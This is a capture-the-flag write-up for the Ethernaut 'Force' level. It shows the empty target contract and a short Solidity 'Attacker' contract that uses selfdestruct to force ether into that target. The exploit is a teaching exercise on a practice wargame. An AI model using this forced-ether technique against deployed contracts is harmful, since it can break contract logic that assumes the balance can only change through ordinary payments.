# Ethernaut: 7. Force

> Some contracts will simply not take your money ¯\\\_(ツ)\_/¯

**Objective of CTF:**

- Make the balance of the contract greater than zero.

**Target contract:**

[Play the level](https://ethernaut.openzeppelin.com/level/0x22699e6AdD7159C3C385bf4d7e1C647ddB3a99ea)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```

This contract is supposedly not accepting any payments. Well, it is possible to force money into a contract by `selfdestruct`'ing a contract with some balance, with the target contract address as the parameter.

We deploy the contract below with some small amount of ether, and then call the `pwn` function to let it `selfdestruct` and transfer all of its balance to the target contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attacker {
  function pwn(address _target) payable public {
    selfdestruct(payable(_target));
  }
}
```

That is all about this one!
